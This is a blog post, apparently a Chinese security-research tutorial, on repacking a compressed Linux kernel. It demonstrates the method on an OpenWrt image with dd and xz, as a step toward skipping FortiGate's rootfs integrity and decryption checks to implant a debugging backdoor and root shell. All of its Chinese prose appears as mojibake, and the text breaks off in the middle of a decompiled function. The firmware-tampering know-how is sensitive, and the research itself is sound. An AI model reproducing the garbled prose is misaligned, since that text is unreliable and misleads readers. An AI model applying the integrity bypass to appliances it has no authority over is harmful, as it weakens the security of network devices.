<h2 id="æ–°çš„éªŒè¯é€»è¾‘"><a href="#æ–°çš„éªŒè¯é€»è¾‘" class="headerlink" title="æ–°çš„éªŒè¯é€»è¾‘"></a>æ–°çš„éªŒè¯é€»è¾‘</h2><p>æˆ‘ä»¬åœ¨ä¹‹å‰çš„<a href="https://wzt.ac.cn/2023/03/02/fortigate_debug_env1/">æ–‡ç« </a>ä¸­ä»‹ç»äº†å¦‚ä½•å‘ FortiGate ä¸­æ¤å…¥åé—¨å¹¶è·å– SHELL æ–¹ä¾¿è°ƒè¯•ï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œå¼€å‘è€…æ·»åŠ äº†å¤šç§ç³»ç»Ÿå®Œæ•´æ€§éªŒè¯é€»è¾‘ï¼Œå¹¶ä¸”åŠ å¯†äº† rootfs.gz æ–‡ä»¶ï¼Œæ—§çš„æ–¹æ³•å¤±æ•ˆï¼Œåœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œæä¾›ä¸€ç§ç›¸å¯¹ç®€å•çš„æ–¹æ³•ï¼Œå®ç°å‘æ–°ç‰ˆæœ¬ FortiGate ä¸­æ·»åŠ åé—¨å¹¶è·å– SHELL æƒé™ã€‚</p>
<p>åœ¨ 2024 å¹´ 3 æœˆ 4 æ—¥ï¼Œ<a class="link"   href="https://www.optistream.io/blogs/tech/fortigate-firmware-analysis" >optistream<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> çš„ç ”ç©¶äººå‘˜å‘å¸ƒäº†ä¸€ç¯‡æ–‡ç« ï¼Œè¯¦ç»†æè¿°äº†åœ¨æ–°ç‰ˆ FortiGate ä¸­æ·»åŠ çš„åŠ å¯†å’Œæ ¡éªŒé€»è¾‘ï¼Œå¹¶ä¸”èƒ½å¤Ÿç»•è¿‡è¿™äº›æ ¡éªŒï¼Œæœ€ç»ˆè·å– root shellï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥å‚è€ƒä»–ä»¬çš„åˆ†ææ–‡ç« ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œåªåšç®€è¦æ€»ç»“ã€‚</p>
<p>ç›¸å¯¹äºæ—§ç‰ˆæœ¬æ¥è¯´ï¼Œä¸»è¦çš„å˜åŠ¨æœ‰</p>
<ol>
<li>åœ¨å†…æ ¸ä¸­æ·»åŠ äº†å¯¹ rootfs.gz æ–‡ä»¶çš„å®Œæ•´æ€§æ ¡éªŒå’Œè§£å¯†ç®—æ³•</li>
<li>åœ¨ç”¨æˆ·æ€æ·»åŠ äº† <code>.db</code> æ–‡ä»¶çš„å®Œæ•´æ€§æ ¡éªŒ</li>
<li>åœ¨ç³»ç»Ÿä¸­å®ç°äº† â€œ<em>forticron</em>â€œ  è‡ªåŠ¨ä»»åŠ¡ï¼Œå¯èƒ½ä¼šåœ¨ç³»ç»Ÿè¿è¡ŒæœŸé—´è‡ªåŠ¨å¯¹æ–‡ä»¶ç³»ç»Ÿæ‰§è¡Œå®Œæ•´æ€§æ ¡éªŒ</li>
</ol>
<p>åä¸¤ç‚¹æœ¬è´¨ä¸Šå¯¹ç ´è§£æµç¨‹æ²¡æœ‰å¾ˆå¤§å½±å“ï¼Œåªéœ€è¦æ‰¾åˆ°è¿™äº›æ–°æ·»åŠ çš„æ ¡éªŒé€»è¾‘å¹¶å°†å®ƒä»¬ Patch æ‰å³å¯ã€‚è€Œå½±å“è¾ƒå¤§çš„æ˜¯ rootfs.gz è¢«åŠ å¯†ï¼Œå¹¶ä¸”åœ¨å†…æ ¸ä¸­è¿›è¡Œæ ¡éªŒå’Œè§£å¯†ã€‚è§£å¯†ç®—æ³•åœ¨ optistream åˆ†ææ–‡ç« ä¸­å·²ç»ç»™å‡ºï¼Œä»–ä»¬çš„æ€è·¯ä¸º Patch æ‰ç”¨æˆ·ç©ºé—´å®Œæ•´æ€§æ ¡éªŒï¼Œæ¤å…¥åé—¨å¹¶å¯åŠ¨ç³»ç»Ÿï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è°ƒè¯•å†…æ ¸ï¼Œè·³è¿‡å†…æ ¸ä¸­çš„æ ¡éªŒç®—æ³•ï¼Œæœ€ç»ˆä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿæ­£å¸¸å¯åŠ¨ï¼Œè¿™ä¸€ç‚¹å’Œæœ¬åšå®¢å‰ç¯‡æ–‡ç« ç±»ä¼¼ã€‚</p>
<p>æœ¬æ–‡å°†ä»‹ç»ä¸€ç§æ›´åŠ ç®€æ´çš„æ–¹æ³•ï¼Œæ— éœ€è°ƒè¯•å†…æ ¸å³å¯æ­£å¸¸å¯åŠ¨ç³»ç»Ÿã€‚</p>
<h2 id="ä¿®æ”¹å†…æ ¸"><a href="#ä¿®æ”¹å†…æ ¸" class="headerlink" title="ä¿®æ”¹å†…æ ¸"></a>ä¿®æ”¹å†…æ ¸</h2><p>FortiGate çš„å†…æ ¸æ–‡ä»¶æ˜¯ flatkcï¼Œé€šè¿‡ file å‘½ä»¤å¯ä»¥çœ‹åˆ°å®ƒçš„æ ¼å¼ä¸ºï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flatkc: Linux kernel x86 boot executable bzImage, version 4.19.13 (root@build) #1 SMP Thu Feb 1 17:10:41 UTC 2024, RO-rootFS, swap_dev 0X7, Normal VGA</span><br></pre></td></tr></table></figure></div>

<p>bzImage æ˜¯ Linux å†…æ ¸çš„ä¸€ç§å¼•å¯¼æ˜ åƒæ ¼å¼ï¼Œä¸»è¦ç”¨äºåŸºäº x86&#x2F;x64 æ¶æ„çš„è®¡ç®—æœºï¼ŒbzImage ä¸­åŒ…å«è¢«å‹ç¼©çš„å†…æ ¸æ–‡ä»¶(vmlinux)ä»¥åŠä¸€æ®µç”¨äºè§£å‹å†…æ ¸çš„ä»£ç ï¼Œå¦å¤–å®ƒè¿˜è´Ÿè´£å¤„ç†å†…æ ¸å‘½ä»¤è¡Œå‚æ•°ç­‰è¾…åŠ©æ•°æ®ã€‚</p>
<p>bzImage ç­‰æ ¼å¼çš„é•œåƒå¯ä»¥ä½¿ç”¨ <a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> é¡¹ç›®ç›´æ¥è½¬æ¢ä¸º ELF æ–‡ä»¶ï¼Œé€šè¿‡åˆ†æ ELF æ–‡ä»¶å®šä½åˆ°æ ¡éªŒå’Œè§£å¯†å†…æ ¸çš„å‡½æ•°æ˜¯ fgt_verify_initrdã€‚ç†æƒ³æƒ…å†µä¸‹ Patch å†…æ ¸çš„æ€è·¯åº”è¯¥æ˜¯</p>
<ol>
<li>å°† bzImage è§£å‹</li>
<li>ä¿®æ”¹ vmlinux ä¸­çš„ä»£ç </li>
<li>å°† vmlinux å‹ç¼©å› bzImageï¼Œå¹¶ç¡®ä¿ç³»ç»Ÿä»èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨</li>
</ol>
<p>å‰ä¸¤æ­¥å¯ä»¥å®¹æ˜“çš„å®Œæˆï¼Œä½†å¦‚ä½•å°† vmlinux å‹ç¼©å› bzImage å´æ²¡æœ‰æƒ³è±¡ä¸­é‚£æ ·ç®€å•ã€‚</p>
<p>åœ¨åˆ†æè¿‡ç¨‹ä¸­æˆ‘æŸ¥é˜…äº†ç½‘ç»œä¸Šçš„å¤šç¯‡èµ„æ–™ï¼Œæœ€ç»ˆæ‰¾åˆ°ä¸€ä½ä½œè€… jamchamb å‘å¸ƒçš„<a class="link"   href="https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html" >åšå®¢æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæ–‡ä¸­ä»‹ç»äº†å¦‚ä½•ä»é€†å‘è§’åº¦ä¿®æ”¹ ARM zImage å†…æ ¸æ–‡ä»¶ï¼Œæœ€ç»ˆæˆåŠŸå®Œæˆé‡æ‰“åŒ…æ“ä½œï¼Œä¿®æ”¹äº†ç³»ç»Ÿå¯åŠ¨æ—¶è¾“å‡ºçš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘ä»¬å…ˆå¤ç°ä¸€ä¸‹æ–‡ä¸­æåˆ°çš„æ–¹æ³•ï¼Œè¯¦ç»†è¿‡ç¨‹å¯ä»¥é˜…è¯»åŸä½œè€…æ–‡ç« ã€‚</p>
<p>é¦–å…ˆä¸‹è½½ zImage æ–‡ä»¶å¹¶ä½¿ç”¨ QEMU å°è¯•å¯åŠ¨</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://archive.openwrt.org/releases/17.01.0/targets/armvirt/generic/lede-17.01.0-r3205-59508e3-armvirt-zImage-initramfs -O zImage-initramfs</span><br><span class="line">qemu-system-arm -serial stdio -M virt -m 1024 -kernel zImage-initramfs</span><br></pre></td></tr></table></figure></div>

<p>ç­‰å¾…å¯åŠ¨åæŒ‰ä¸‹å›è½¦å¯æ­£å¸¸è¿›å…¥ shellï¼Œè¾“å‡ºä¿¡æ¯å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.25.1 () built-in shell (ash)</span><br><span class="line"></span><br><span class="line">     _________</span><br><span class="line">    /        /\      _    ___ ___  ___</span><br><span class="line">   /  LE    /  \    | |  | __|   \| __|</span><br><span class="line">  /    DE  /    \   | |__| _|| |) | _|</span><br><span class="line"> /________/  LE  \  |____|___|___/|___|                      lede-project.org</span><br><span class="line"> \        \   DE /</span><br><span class="line">  \    LE  \    /  -----------------------------------------------------------</span><br><span class="line">   \  DE    \  /    Reboot (17.01.0, r3205-59508e3)</span><br><span class="line">    \________\/    -----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">=== WARNING! =====================================</span><br><span class="line">There is no root password defined on this device!</span><br><span class="line">Use the &quot;passwd&quot; command to set up a new password</span><br><span class="line">in order to prevent unauthorized SSH logins.</span><br><span class="line">--------------------------------------------------</span><br><span class="line">root@(none):/#</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¸Œæœ›å°† <code>WARNING!</code> å­—ç¬¦ä¸²ä¿®æ”¹ä¸º <code>NORMAL!!</code>ã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹ Linux <a class="link"   href="https://elixir.bootlin.com/linux/v4.4.50/source/arch/arm/boot/compressed" >æºç ç›®å½•<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œåœ¨ zImage ä¸­è¢«å‹ç¼©çš„ vmlinux å«åš Piggyï¼ŒPiggy å¯ä»¥ç”±ä¸åŒçš„ç®—æ³•å‹ç¼©ï¼Œæˆ‘ä»¬ä¸‹è½½çš„é•œåƒä½¿ç”¨çš„å‹ç¼©ç®—æ³•ä¸º xz</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">15400         0x3C28          xz compressed data</span><br><span class="line">15632         0x3D10          xz compressed data</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ piggy.xzkern.S æ±‡ç¼–ä¸­çœ‹åˆ° Piggy åœ¨ zImage æ–‡ä»¶ä¸­çš„ä½ç½®ç”± input_dataã€input_data_end ç•Œå®šï¼Œè¿™äº›å˜é‡åœ¨ arch&#x2F;arm&#x2F;boot&#x2F;compressed&#x2F;misc.c ä¸­çš„ decompress_kernel å‡½æ•°è¢«å¼•ç”¨</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">decompress_kernel</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> output_start, <span class="type">unsigned</span> <span class="type">long</span> free_mem_ptr_p,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> free_mem_ptr_end_p,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> arch_id)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	__stack_chk_guard_setup();</span><br><span class="line"></span><br><span class="line">	output_data		= (<span class="type">unsigned</span> <span class="type">char</span> *)output_start;</span><br><span class="line">	free_mem_ptr		= free_mem_ptr_p;</span><br><span class="line">	free_mem_end_ptr	= free_mem_ptr_end_p;</span><br><span class="line">	__machine_arch_type	= arch_id;</span><br><span class="line"></span><br><span class="line">	arch_decomp_setup();</span><br><span class="line"></span><br><span class="line">	putstr(<span class="string">&quot;Uncompressing Linux...&quot;</span>);</span><br><span class="line">	ret = do_decompress(input_data, input_data_end - input_data,</span><br><span class="line">			    output_data, error);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		error(<span class="string">&quot;decompressor returned an error&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		putstr(<span class="string">&quot; done, booting the kernel.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>do_decompress å‡½æ•°è´Ÿè´£å¯¹å†…æ ¸æ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œå¯¹ç…§æºç æŸ¥çœ‹ zImage çš„åç¼–è¯‘ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decompress_kernel</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> output_start, <span class="type">unsigned</span> <span class="type">int</span> free_mem_ptr_p, <span class="type">unsigned</span> <span class="type">int</span> free_mem_ptr_end_p, <span class="type">int</span> arch_id)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  sub_9AC();</span><br><span class="line">  v5 = <span class="string">&quot;Uncompressing Linux...&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v5++ )</span><br><span class="line">    ;</span><br><span class="line">  result = do_decompress(input_data, <span class="number">0x2BB404</span>, output_start, sub_940);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_940(<span class="string">&quot;decompressor returned an error&quot;</span>);</span><br><span class="line">  v8 = <span class="string">&quot; done, booting the kernel.\n&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v8++ )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·æ‰¾åˆ°äº† input_data å’Œ input_data_end ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œä¹Ÿå°±å¯ä»¥å®šä½åˆ° Piggy çš„ä½ç½®ã€‚</p>
<p>å°† Piggy æ‹†å‡º</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=zImage-initramfs of=vmlinux.xz ibs=1 skip=$[0x3d10] count=$[0x2BB404]</span><br></pre></td></tr></table></figure></div>

<p>æ³¨æ„æ‹†åˆ†å‡ºæ¥çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ xz å‹ç¼©åŒ…ï¼Œä½†æ˜¯åœ¨æœ«å°¾å¤šå‡ºäº† 4 ä¸ªå­—èŠ‚ï¼Œç”¨æ¥å­˜æ”¾åŸå§‹ vmlinux çš„å¤§å°ï¼Œè¿™ä¸€ç‚¹å¯ä»¥åœ¨<a class="link"   href="https://elixir.bootlin.com/linux/v4.4.50/source/scripts/Makefile.lib#L374" >æºç <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸­çœ‹åˆ°ã€‚å› æ­¤è§£å‹æ—¶ä½¿ç”¨å‚æ•° <code>--single-stream</code> é¿å…å‡ºç°è§£å‹å¤±è´¥çš„æç¤ºã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">unxz --verbose --single-stream vmlinux.xz</span><br></pre></td></tr></table></figure></div>

<p>æ‰“å¼€è§£å‹å¾—åˆ°çš„ vmlinuxï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°æƒ³è¦ä¿®æ”¹çš„å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹ï¼Œå®Œæˆä¹‹åæŠŠ vmlinux é‡æ–°å‹ç¼©å› Piggy ï¼ˆè¿™é‡Œä½¿ç”¨äº† xz çš„ nice å‚æ•°ï¼Œä»¥ä¾¿äºè®©é‡æ‰“åŒ…çš„æ–‡æ¡£å°½å¯èƒ½å°äºåŸå§‹æ–‡æ¡£ï¼‰</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">xz --check=crc32 --arm --lzma2=,dict=32MiB,<span class="built_in">nice</span>=128 &lt; vmlinux &gt; vmlinux-mod-warntest.xz</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°çš„ xz æ–‡æ¡£ç›¸æ¯”æºæ–‡æ¡£æ›´å°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rw-rw-r--  1 admin admin 2863840  3æœˆ 14 18:04 vmlinux-mod-warntest.xz</span><br><span class="line">-rw-rw-r--  1 admin admin 2864132  3æœˆ 14 18:05 vmlinux.xz</span><br></pre></td></tr></table></figure></div>

<p>æ¥ä¸‹æ¥è¦æŠŠä¿®æ”¹ä¹‹åçš„æ–‡æ¡£é‡æ–°å¡å…¥ zImage ä¸­ï¼Œç”±äºæ–°çš„æ–‡æ¡£æ›´å°ï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘æ‰©å®¹çš„é—®é¢˜ï¼Œç¼ºå¤±çš„éƒ¨åˆ†ä½¿ç”¨ 00 å¡«å……ï¼Œä¸ä¼šå½±å“ xz æ­£å¸¸è§£å‹ã€‚ä¸è¿‡æ³¨æ„ä¿ç•™åŸæ¥ xz æ–‡æ¡£ç»“å°¾çš„ 4 ä¸ªå­—èŠ‚ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> zImage-initramfs zImage-initramfs-warnmod</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=zImage-initramfs-warnmod bs=1 seek=$[0x3d10] count=$[0x2bb400] conv=notrunc</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=vmlinux-mod-warntest.xz of=zImage-initramfs-warnmod bs=1 seek=$[0x3d10] conv=notrunc</span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹ä¹‹åå¯åŠ¨æ–°çš„é•œåƒ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-arm -serial stdio -M virt -m 1024 -kernel zImage-initramfs-warnmod</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥åœ¨ç»ˆç«¯çœ‹åˆ°ä¿®æ”¹å·²ç»æˆåŠŸ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.25.1 () built-in shell (ash)</span><br><span class="line"></span><br><span class="line">     _________</span><br><span class="line">    /        /\      _    ___ ___  ___</span><br><span class="line">   /  LE    /  \    | |  | __|   \| __|</span><br><span class="line">  /    DE  /    \   | |__| _|| |) | _|</span><br><span class="line"> /________/  LE  \  |____|___|___/|___|                      lede-project.org</span><br><span class="line"> \        \   DE /</span><br><span class="line">  \    LE  \    /  -----------------------------------------------------------</span><br><span class="line">   \  DE    \  /    Reboot (17.01.0, r3205-59508e3)</span><br><span class="line">    \________\/    -----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">=== NORMAL!! =====================================</span><br><span class="line">There is no root password defined on this device!</span><br><span class="line">Use the &quot;passwd&quot; command to set up a new password</span><br><span class="line">in order to prevent unauthorized SSH logins.</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure></div>

<p>åŸºäºä»¥ä¸Šæ€è·¯ï¼ŒçŒœæµ‹å¯¹ FortiGate çš„ flatkc ä¹Ÿå¯ä»¥æ‰§è¡Œç±»ä¼¼çš„æ“ä½œï¼Œå…ˆå°† Piggy å–å‡ºï¼Œè§£å‹åæŠŠæ ¡éªŒå’Œè§£å¯† rootfs.gz çš„å‡½æ•°è·³è¿‡ï¼Œå†å°†å†…æ ¸é‡æ–°å‹ç¼©å¹¶å¡å› flatkc ä¸­ã€‚</p>
<p>flatkc æ˜¯ä¸€ä¸ª x86 é•œåƒï¼Œæ‰€ä»¥åœ¨ Linux æºç ä¸­æ‰¾åˆ° arch&#x2F;x86&#x2F;boot&#x2F;compressed ç›®å½•ï¼Œåœ¨ misc.c ä¸­æ‰¾åˆ°äº†å«åš extract_kernel çš„å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> *<span class="title function_">extract_kernel</span><span class="params">(<span class="type">void</span> *rmode, memptr heap,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">char</span> *input_data,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">long</span> input_len,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">char</span> *output,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">long</span> output_len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> kernel_total_size = VO__end - VO__text;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> virt_addr = LOAD_PHYSICAL_ADDR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Retain x86 boot parameters pointer passed from startup_32/64. */</span></span><br><span class="line">	boot_params = rmode;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Clear flags intended for solely in-kernel use. */</span></span><br><span class="line">	boot_params-&gt;hdr.loadflags &amp;= ~KASLR_FLAG;</span><br><span class="line"></span><br><span class="line">	sanitize_boot_params(boot_params);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (boot_params-&gt;screen_info.orig_video_mode == <span class="number">7</span>) &#123;</span><br><span class="line">		vidmem = (<span class="type">char</span> *) <span class="number">0xb0000</span>;</span><br><span class="line">		vidport = <span class="number">0x3b4</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		vidmem = (<span class="type">char</span> *) <span class="number">0xb8000</span>;</span><br><span class="line">		vidport = <span class="number">0x3d4</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lines = boot_params-&gt;screen_info.orig_video_lines;</span><br><span class="line">	cols = boot_params-&gt;screen_info.orig_video_cols;</span><br><span class="line"></span><br><span class="line">	console_init();</span><br><span class="line">	debug_putstr(<span class="string">&quot;early console in extract_kernel\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	free_mem_ptr     = heap;	<span class="comment">/* Heap */</span></span><br><span class="line">	free_mem_end_ptr = heap + BOOT_HEAP_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Report initial kernel position details. */</span></span><br><span class="line">	debug_putaddr(input_data);</span><br><span class="line">	debug_putaddr(input_len);</span><br><span class="line">	debug_putaddr(output);</span><br><span class="line">	debug_putaddr(output_len);</span><br><span class="line">	debug_putaddr(kernel_total_size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="comment">/* Report address of 32-bit trampoline */</span></span><br><span class="line">	debug_putaddr(trampoline_32bit);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The memory hole needed for the kernel is the larger of either</span></span><br><span class="line"><span class="comment">	 * the entire decompressed kernel plus relocation table, or the</span></span><br><span class="line"><span class="comment">	 * entire decompressed kernel plus .bss and .brk sections.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	choose_random_location((<span class="type">unsigned</span> <span class="type">long</span>)input_data, input_len,</span><br><span class="line">				(<span class="type">unsigned</span> <span class="type">long</span> *)&amp;output,</span><br><span class="line">				max(output_len, kernel_total_size),</span><br><span class="line">				&amp;virt_addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate memory location choices. */</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)output &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination physical address inappropriately aligned&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address inappropriately aligned&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="keyword">if</span> (heap &gt; <span class="number">0x3fffffffffff</span>UL)</span><br><span class="line">		error(<span class="string">&quot;Destination address too large&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr + max(output_len, kernel_total_size) &gt; KERNEL_IMAGE_SIZE)</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address is beyond the kernel mapping area&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">if</span> (heap &gt; ((-__PAGE_OFFSET-(<span class="number">128</span>&lt;&lt;<span class="number">20</span>)<span class="number">-1</span>) &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination address too large&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_RELOCATABLE</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)output != LOAD_PHYSICAL_ADDR)</span><br><span class="line">		error(<span class="string">&quot;Destination address does not match LOAD_PHYSICAL_ADDR&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr != LOAD_PHYSICAL_ADDR)</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address changed when not relocatable&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	debug_putstr(<span class="string">&quot;\nDecompressing Linux... &quot;</span>);</span><br><span class="line">	__decompress(input_data, input_len, <span class="literal">NULL</span>, <span class="literal">NULL</span>, output, output_len,</span><br><span class="line">			<span class="literal">NULL</span>, error);</span><br><span class="line">	parse_elf(output);</span><br><span class="line">	handle_relocations(output, output_len, virt_addr);</span><br><span class="line">	debug_putstr(<span class="string">&quot;done.\nBooting the kernel.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡æœç´¢å‡½æ•°å‡ºç°çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œåœ¨ flatkc ä¸­æ‰¾åˆ°äº†è¯¥å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 *__fastcall <span class="title function_">extract_kernel</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *rmode,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *heap,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 *input_data,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> input_len,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 *output,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> output_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v8 = heap;</span><br><span class="line">  v11 = rmode;</span><br><span class="line">  *(rmode + <span class="number">529</span>) &amp;= ~<span class="number">2u</span>;</span><br><span class="line">  v12 = *(rmode + <span class="number">495</span>) == <span class="number">0</span>;</span><br><span class="line">  qword_700690 = rmode;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">192</span>, <span class="number">0</span>, <span class="number">256LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">491</span>, <span class="number">0</span>, <span class="number">6LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">616</span>, <span class="number">0</span>, <span class="number">40LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">3280</span>, <span class="number">0</span>, <span class="number">48LL</span>);</span><br><span class="line">    